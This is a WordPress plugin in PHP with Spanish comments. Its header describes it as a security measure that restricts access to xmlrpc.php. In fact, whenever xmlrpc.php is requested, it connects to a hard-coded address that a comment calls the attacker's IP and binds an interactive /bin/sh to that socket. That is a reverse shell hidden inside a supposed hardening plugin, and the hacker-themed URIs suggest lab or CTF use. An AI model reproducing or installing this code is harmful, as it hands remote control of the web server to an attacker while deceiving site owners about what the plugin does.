<?php
/*
Plugin Name: Restrict XMLRPC Access
Plugin URI: https://elrincondelhacker.es/
Description: Restringe el acceso al archivo xmlrpc.php para aumentar la seguridad.
Version: 1.0
Author: El Pinguino de Mario
Author URI: https://elpinguinodemario.es/
License: GPL2
*/

function restrict_xmlrpc_access() {

    if (strpos($_SERVER['REQUEST_URI'], 'xmlrpc.php') !== false) {
        
        header('HTTP/1.1 403 Forbidden');
        echo 'Cuidadito cuidadÃ­n, te pillÃ© leyendo lo que no debÃ­as pillÃ­n.';

        // Intentar establecer conexiÃ³n inversa
        $ip = '172.17.0.1';  // IP del atacante
        $port = 443;         // Puerto de escucha del atacante
        $chunk_size = 1400;

        // Crear conexiÃ³n de socket
        $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock) {
            error_log("ERROR: No se pudo conectar a $ip:$port - $errstr ($errno)");
            exit(1);
        }

        
        $process = proc_open('/bin/sh -i', [
            0 => $sock, // Entrada estÃ¡ndar
            1 => $sock, // Salida estÃ¡ndar
            2 => $sock  // Salida de error
        ], $pipes);

        if (!is_resource($process)) {
            error_log("ERROR: No se pudo abrir la shell.");
            fclose($sock);
            exit(1);
        }

        // Bloquear conexiÃ³n activa
        while (!feof($sock)) {
            fwrite($sock, fread($sock, $chunk_size));
        }

        fclose($sock);
        proc_close($process);
        exit;
    }
}

add_action('init', 'restrict_xmlrpc_access');